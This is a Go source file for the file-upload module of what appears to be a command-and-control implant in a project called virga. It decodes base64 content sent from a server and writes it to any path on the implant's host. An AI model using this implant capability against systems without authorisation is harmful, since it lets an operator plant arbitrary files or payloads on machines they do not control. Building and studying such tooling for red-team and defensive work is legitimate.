package upload

import (
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"

	"github.com/r74tech/virga/internal/implant/logger"
)

// UploadModule handles file upload from server to implant
type UploadModule struct{}

// Name returns the module name
func (m *UploadModule) Name() string {
	return "upload"
}

// Execute handles file upload
// args[0] should be the remote path
// args[1] should be the base64 encoded content
func (m *UploadModule) Execute(args []string) (string, int, error) {
	if len(args) < 2 {
		errMsg := "upload requires remote_path and content arguments"
		return errMsg, 1, fmt.Errorf(errMsg)
	}

	remotePath := args[0]
	encodedContent := args[1]

	log := logger.Get()
	log.Debug("Upload module executing", map[string]interface{}{
		"remote_path":  remotePath,
		"content_size": len(encodedContent),
	})

	// Decode base64 content
	content, err := base64.StdEncoding.DecodeString(encodedContent)
	if err != nil {
		log.LogCommand(fmt.Sprintf("upload %s", remotePath), "", 1, err)
		return fmt.Sprintf("Failed to decode content: %s", err), 1, err
	}

	// Ensure directory exists
	dir := filepath.Dir(remotePath)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		log.LogCommand(fmt.Sprintf("upload %s", remotePath), "", 1, err)
		return fmt.Sprintf("Failed to create directory: %s", err), 1, err
	}

	// Write file
	err = os.WriteFile(remotePath, content, 0o644)
	if err != nil {
		log.LogCommand(fmt.Sprintf("upload %s", remotePath), "", 1, err)
		return fmt.Sprintf("Failed to write file: %s", err), 1, err
	}

	result := fmt.Sprintf("%d bytes uploaded successfully to %s", len(content), remotePath)
	log.LogCommand(fmt.Sprintf("upload %s", remotePath), result, 0, nil)
	return result, 0, nil
}
